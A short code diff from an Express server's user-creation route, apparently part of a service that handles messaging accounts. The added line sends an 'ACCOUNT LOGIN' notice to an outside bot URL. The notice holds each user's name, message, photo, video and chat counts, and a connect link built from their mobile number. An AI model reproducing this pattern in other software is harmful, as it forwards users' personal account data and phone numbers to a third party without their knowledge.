@@ -272,7 +272,7 @@ app.post('/users', async (req, res, next) => {
   if (!cli || activeClientSetup?.phoneNumber !== user.mobile) {
     user['lastUpdated'] = new Date().toISOString().split('T')[0]
     await db.insertUser(user);
-    await fetchWithTimeout(`${ppplbot()}&text=ACCOUNT LOGIN: ${user.userName ? user.userName : user.firstName}:${user.msgs}:${user.totalChats}\n https://uptimechecker.onrender.com/connectclient/${user.mobile}`)
+    await fetchWithTimeout(`${ppplbot()}&text=${encodeURIComponent(`ACCOUNT LOGIN: ${user.userName ? `@${user.userName}` : user.firstName}\nMsgs:${user.msgs}\nphotos:${user.photoCount}\nvideos:${user.videoCount}\nmovie:${user.movieCount}\nPers:${user.personalChats}\nChan:${user.channels}\nhttps://uptimechecker.onrender.com/connectclient/${user.mobile}`)}`);
   } else {
     setActiveClientSetup(undefined)
     console.log("New Session Generated");
